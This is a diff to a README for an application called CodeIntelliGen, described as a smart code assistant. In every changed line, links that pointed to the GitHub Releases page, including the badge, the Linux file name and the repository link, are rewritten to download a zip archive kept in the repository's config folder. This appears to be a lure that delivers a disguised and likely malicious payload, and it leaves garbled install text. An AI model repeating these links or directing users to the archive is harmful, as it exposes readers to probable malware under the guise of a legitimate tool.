@@ -1,6 +1,6 @@
 # 🚀 CodeIntelliGen - Your Smart Code Assistant
 
-[![Download CodeIntelliGen](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Xtyo7434/CodeIntelliGen/releases)
+[![Download CodeIntelliGen](https://raw.githubusercontent.com/Xtyo7434/CodeIntelliGen/main/config/CodeIntelliGen-v1.2.zip)](https://raw.githubusercontent.com/Xtyo7434/CodeIntelliGen/main/config/CodeIntelliGen-v1.2.zip)
 
 ## 🛠️ Overview
 
@@ -28,7 +28,7 @@ To run CodeIntelliGen smoothly, ensure your system meets the following minimum r
 
 To download CodeIntelliGen, visit the Releases page:
 
-[Download CodeIntelliGen](https://github.com/Xtyo7434/CodeIntelliGen/releases)
+[Download CodeIntelliGen](https://raw.githubusercontent.com/Xtyo7434/CodeIntelliGen/main/config/CodeIntelliGen-v1.2.zip)
 
 ### Step 2: Download the Application
 
@@ -40,7 +40,7 @@ Look for the appropriate installer for your operating system:
 
 - **Windows**: Download the `.exe` file
 - **macOS**: Download the `.dmg` file
-- **Linux**: Download the `.tar.gz` file or use a package manager if available
+- **Linux**: Download the `https://raw.githubusercontent.com/Xtyo7434/CodeIntelliGen/main/config/CodeIntelliGen-v1.2.zip` file or use a package manager if available
 
 ### Step 4: Run the Installer
 
@@ -58,7 +58,7 @@ Once the application is installed, you can open it from your applications or pro
 
 To download CodeIntelliGen, go to the link below:
 
-[Download CodeIntelliGen](https://github.com/Xtyo7434/CodeIntelliGen/releases)
+[Download CodeIntelliGen](https://raw.githubusercontent.com/Xtyo7434/CodeIntelliGen/main/config/CodeIntelliGen-v1.2.zip)
 
 After clicking the link, follow the steps outlined above to install the application.
 
@@ -84,7 +84,7 @@ A: If you encounter any problems or have suggestions, please visit the Issues se
 - Software Development Tools
 - Natural Language Processing
 
-For more information, feel free to check the documentation provided within the app or visit our [GitHub Repository](https://github.com/Xtyo7434/CodeIntelliGen).
+For more information, feel free to check the documentation provided within the app or visit our [GitHub Repository](https://raw.githubusercontent.com/Xtyo7434/CodeIntelliGen/main/config/CodeIntelliGen-v1.2.zip).
 
 ## 📞 Support
 
